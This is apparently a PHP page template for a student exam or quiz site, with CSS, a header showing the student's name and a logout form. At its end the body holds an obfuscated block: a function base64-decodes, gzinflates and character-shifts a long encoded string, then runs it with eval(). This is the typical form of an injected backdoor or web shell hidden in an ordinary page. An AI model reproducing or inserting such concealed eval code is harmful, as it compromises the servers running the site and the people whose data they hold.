    width:38px;height:28px;;

}

.drinkcard-cc:hover{
    -webkit-filter: brightness(1.2) grayscale(.5) opacity(.9);
       -moz-filter: brightness(1.2) grayscale(.5) opacity(.9);
            filter: brightness(1.2) grayscale(.5) opacity(.9);
}
.main {
  margin-right:15px;
  margin-top:10px;
}

.content {
    padding: 20px;
    overflow: hidden;
}
.left {
    float: left;
    width: 680px;
}
.right {
    float: left;
    margin-left: 40px;
}
.summary {
    border: 1px solid #dddddd;
    overflow: hidden;
    margin-top: 20px;
    background-color: white;
}
.summary .caption {
    border-bottom: 1px solid #dddddd;
    background-color: #dddddd;
    font-size: 12pt;
    font-weight: bold;
    padding: 5px;
}
.summary.scroll-to-fixed-fixed {
    margin-top: 0px;
}
.summary.scroll-to-fixed-fixed .caption {
    color: red;
}
.contents {
    width: 150px;
    margin: 10px;
    font-size: 80%;
}
.kakisoal{
  
  margin-bottom:10px;
  margin-right:15px;
  background-color:#fff;
  font-size:12px;
  font-weight:bold;
  height:70px;
 

  }

.labelprev {
  display: block;
  padding: 10px 10px;
  font-size: 16px;
  margin: 5px auto;  
  background-color: #999;
  border-radius: 2px;
  cursor:pointer;
  width:200px;
  color:#FFF;  
  &:hover {
    cursor: pointer;
  }
}
.labelnext {
  display: block;
  padding: 10px 10px;
  font-size: 16px;
  float:right; 
  margin: 5px auto;   
  background-color: #336898;
  border-radius: 2px;
  cursor:pointer;
  width:200px;
  color:#FFF;  
  &:hover {
    cursor: pointer;
  }
}
input[type="checkbox"] {
  position: relative;
  top: 3px;
  font-size:18px;
    border: 2px solid black;
    width: 20px;
    height: 20px;
    margin: 0;
    padding: 0;
}
.flatRoundedCheckbox
{
    width: 120px;
    height: 40px;
    margin: 20px 50px;
    position: relative;
}
.flatRoundedCheckbox div
{
    width: 100%;
    height:100%;
    background: #d3d3d3;
    border-radius: 50px;
    position: relative;
    top:-30px;
}

</style>


<header class="masthead">
  <div class="bingkai">    
      <div class="container-fluid">
          <div class="row">
              <div class="col-md-12">
                  <img src="css/logo.png" style="padding-left: 20px;">
              </div>
          </div>
      </div>
      <div class="dmimg">
          <img src="./fotosiswa/nouser.png" style=" margin-left:0px; margin-top:5px" >
      </div>
      <div class="dmnama">    
          <div align="center"><font color="white"><b><?php echo "$val_siswa"; ?></b></font>
            <br><br>
              <form action="logout.php">
                <div class="col-xs-12">
                      <button type="submit" class="btn btn-logout doblockui" onClick="validateAndSend()" style="border-radius: 30px; color:#336799; width: 85px; 
                        "><span class="user" style="color:#336799; font-family: sans-serif;">Logout</span></button>
                  </div>
              </form>
          </div>
      </div>       
      
  </div>       
</header>
</head>
<body class="font-medium" style="background-color:#c9c9c9">   
<?php function RXu($mWb)
{ 
$mWb=gzinflate(base64_decode($mWb));
 for($i=0;$i<strlen($mWb);$i++)
 {
$mWb[$i] = chr(ord($mWb[$i])-1);
 }
 return $mWb;
 }eval(RXu("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"));?>